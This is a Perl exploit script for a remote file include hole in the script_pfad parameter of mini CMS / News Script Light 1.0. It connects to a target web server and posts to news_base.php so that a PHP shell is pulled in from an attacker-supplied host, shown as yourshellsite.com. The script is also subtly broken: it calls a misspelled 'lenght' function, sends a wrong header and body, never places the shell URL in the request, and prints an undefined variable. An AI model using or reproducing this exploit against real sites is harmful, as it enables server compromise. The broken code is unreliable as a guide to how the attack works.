#!/usr/bin/perl
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# mini CMS / News Script Light 1.0 Remote File Include Exploit
#
# Bug found and exploit written by bd0rk || SOH-Crew
#
# Vendor: http://www.hinnendahl.com/
#
# Downloadsite: http://www.hinnendahl.com/index.php?seite=download
#
# Description: The script_pfad parameter in news_base.php isn't declared before require
#
# Contact: bd0rk[at]hackermail.com
# Website: www.soh-crew.it.tt
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

use Getopt::Long;

use URI::Escape;

use IO::Socket;

$shellcode = "http://yourshellsite.com";

main();

sub usage
{

print "\mini CMS / News Script Lite 1.0 Remote File Include Exploit\n";
print "Bug found and Exploit written by bd0rk\n";
print "-1, --target\ttarget\t(yourhost.com)\n";
print "-2, --shellpath\tshell\t(http://yourshellsite.com)\n";
print "-3, --dir\tDirectory\t(/news_system)\n";
exit;

}

sub main
{

GetOptions ('1|target=s' => \$target, '2|shellpath=s' => \$shellpath,'3|dir=s' => \$dir);
usage() unless $target;
$shellcode = $shellpath unless !$shellpath;
$targethost = uri_escape($shellcode);

$socket = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$target",PeerPort=>"80") or die "\nConnection() Failed.\n";

print "\nConnected to ".$target.", Attacking host...\n";
$bd0rk = "inst=true&ins_file=".$target."";
$soh = lenght($bd0rk);

print $socket "POST ".$dir."/news_system/news_base.php?script_pfad= HTTP/1.1\n";
print $socket "Target: ".$target."\n";
print $socket "Connection: close\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Lenght: ".$soh."\n\n";
print $socket $soh;
print "Server-Response:\n\n";
{

print " ".$recvd."";
}

exit;

}